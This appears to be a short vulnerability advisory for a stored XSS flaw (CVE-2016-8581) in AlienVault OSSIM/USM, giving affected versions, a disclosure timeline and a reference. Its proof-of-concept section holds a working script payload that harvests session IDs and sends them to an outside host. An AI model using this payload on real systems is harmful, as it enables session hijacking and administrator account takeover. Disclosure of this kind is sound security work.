@@ -1,0 +1,46 @@
+Details
+=======
+
+Product: Alienvault OSSIM/USM
+Vulnerability: Stored XSS
+Author: Peter Lapp, lappsec () gmail com
+CVE: CVE-2016-8581
+CVSS: 3.5
+Vulnerable Versions: <=5.3.1
+Fixed Version: 5.3.2
+
+
+
+Vulnerability Details
+=====================
+
+A stored XSS vulnerability exists in the User-Agent header of the
+login process. It's possible to inject a script into that header that
+then gets executed when mousing over the User-Agent field in Settings
+-> Current Sessions.
+
+
+
+POC
+===
+
+The POC uses jQuery to send all session IDs on the "Current Sessions"
+page to an arbitrary site (Google, in this case)
+
+<script>$('#ops_table
+.ops_id').each(function(){$.get("https://www.google.com/",{session:($(this).html())});});</script>
+
+
+
+Timeline
+========
+
+08/03/16 - Reported to Vendor
+10/03/16 - Fixed in version 5.3.2
+
+
+
+References
+==========
+
+https://www.alienvault.com/forums/discussion/7766/security-advisory-alienvault-5-3-2-address-70-vulnerabilities
